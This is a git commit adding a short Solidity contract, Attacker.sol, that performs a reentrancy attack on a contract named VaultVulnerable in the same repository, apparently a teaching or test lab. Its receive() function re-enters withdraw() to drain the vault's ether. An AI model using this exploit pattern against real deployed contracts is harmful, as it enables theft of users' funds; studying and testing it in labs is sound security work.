06e2a3a279dec710f7f5e395638ddc84fd4236bf
Raymico Fuji <129006790+PistolManiac22@users.noreply.github.com>
2026-02-08 14:16:57 +0700

    Update Attacker.sol

--- src/Attacker.sol
+++ src/Attacker.sol
@@ -1,1 +1,23 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
 
+import "./VaultVulnerable.sol";
+
+contract Attacker {
+    VaultVulnerable vault;
+
+    constructor(address _vault) {
+        vault = VaultVulnerable(_vault);
+    }
+
+    receive() external payable {
+        if (address(vault).balance >= 1 ether) {
+            vault.withdraw(1 ether);
+        }
+    }
+
+    function attack() external payable {
+        vault.deposit{value: msg.value}();
+        vault.withdraw(msg.value);
+    }
+}
